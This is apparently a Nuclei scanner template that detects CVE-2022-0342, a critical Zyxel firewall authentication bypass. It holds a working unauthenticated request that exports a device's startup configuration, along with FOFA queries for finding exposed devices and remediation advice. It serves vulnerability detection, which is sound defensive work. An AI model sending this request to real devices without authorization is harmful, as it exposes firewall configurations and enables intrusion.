http:
- matchers:
  - condition: and
    type: word
    words:
    - interface-name
    - saved at
  - condition: and
    part: header
    type: word
    words:
    - text/zyxel
    - attachment; filename=
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cgi-bin/export-cgi?category=config&arg0=startup-config.conf'
id: CVE-2022-0342
info:
  author: SleepingBag945,Powerexploit
  classification:
    cpe: cpe:2.3:o:zyxel:usg40_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-0342
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99642
    epss-score: 0.91427
  description: 'An authentication bypass vulnerability in the CGI program of Zyxel
    USG/ZyWALL series firmware versions 4.20 through 4.70, USG FLEX series firmware
    versions 4.50 through 5.20, ATP series firmware versions 4.32 through 5.20, VPN
    series firmware versions 4.30 through 5.20, and NSG series firmware versions V1.20
    through V1.33 Patch 4, which could allow an attacker to bypass the web authentication
    and obtain administrative access of the device.

    '
  impact: 'Unauthenticated attackers can bypass web authentication and obtain administrative
    access to Zyxel devices, potentially gaining complete control over firewalls and
    network security configurations.

    '
  metadata:
    fofa-query:
    - body="/2FA-access.cgi" && body="zyxel zyxel_style1"
    - body="/2fa-access.cgi" && body="zyxel zyxel_style1"
    max-request: 1
    product: usg40_firmware
    vendor: zyxel
    verified: true
  name: Zyxel - Authentication Bypass
  reference:
  - https://github.com/gobysec/GobyVuls/blob/master/CVE-2022-0342.md
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0342
  - https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml
  - https://github.com/f1tao/awesome-iot-security-resource
  - https://github.com/murchie85/twitterCyberMonitor
  remediation: 'Apply security updates provided by Zyxel for affected USG/ZyWALL,
    USG FLEX, ATP, VPN, and NSG series devices.

    '
  severity: critical
  tags: cve2022,cve,zyxel,auth-bypass,router,vkev,vuln
